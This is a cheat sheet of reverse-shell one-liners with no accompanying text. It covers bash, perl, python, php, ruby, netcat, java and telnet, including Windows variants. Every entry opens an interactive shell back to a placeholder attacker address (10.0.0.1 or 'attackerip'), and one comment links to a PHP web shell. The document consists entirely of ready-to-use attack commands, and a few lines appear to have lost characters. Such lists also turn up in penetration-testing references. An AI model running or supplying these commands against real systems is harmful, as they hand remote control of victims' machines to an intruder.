#bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

#bash alt
exec /bin/bash 0&0 2>&0

#bash alt 2
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

#bash alt 3
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:
while read line 0<&5; do $line 2>&5 >&5; done

#perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#perl alt
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

#perl on windows
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

#python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#full php shell page can be found here: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

#ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#ruby that doesn't depend on /bin/sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#ruby on windows
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#netcat
nc -e /bin/sh 10.0.0.1 1234

#netcat alt
nc -c /bin/sh attackerip 4444

#netcat alt 2
/bin/sh | nc attackerip 4444

#netcat alt 3
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p

#wrong version of netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

#java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

#telnet
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p

#telnet alt
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp


